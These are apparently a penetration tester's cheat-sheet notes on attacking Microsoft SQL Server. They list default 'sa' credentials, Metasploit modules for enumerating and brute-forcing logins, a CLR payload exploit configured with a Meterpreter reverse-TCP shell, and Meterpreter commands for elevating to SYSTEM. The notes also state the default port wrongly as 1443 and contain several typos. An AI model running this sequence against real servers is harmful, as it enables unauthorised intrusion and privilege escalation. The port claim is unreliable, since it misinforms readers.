# Microsoft SQL

MSSQL is the MS equivalent of MySQL, it runs on port 1443 and as the default creds **sa:**.

A way of checking it out is to use metasploit or hydra:

For metasploit you can use the modules:
- use auxiliary/admin/mssql/mssql_enum_sql_logins
- use auxiliary/admin/mssql/mssql_exec (brute force with dict)

When figterprinting with nmap you will likely find the server version running.

For Server 2012 there are various exploits available, one of them giving a metepreter shell:

- exploit/windows/mssql/mssql_clr_payload

*Warning the payload default is x86 but you can be dealing with and x64 device and the exploit will fail in that case change the payload version*

- set PAYLOAD windows/x64/meterpreter/reverse_tcp

In meterpreter we can change to native shell with the shell command.

## Privilege escalation

In case you dont have access to certain files return to your meterpreter shell:

- getuid (get info on your user)
- getprivs (get user privileges)
- getsystem (elevate privileges)
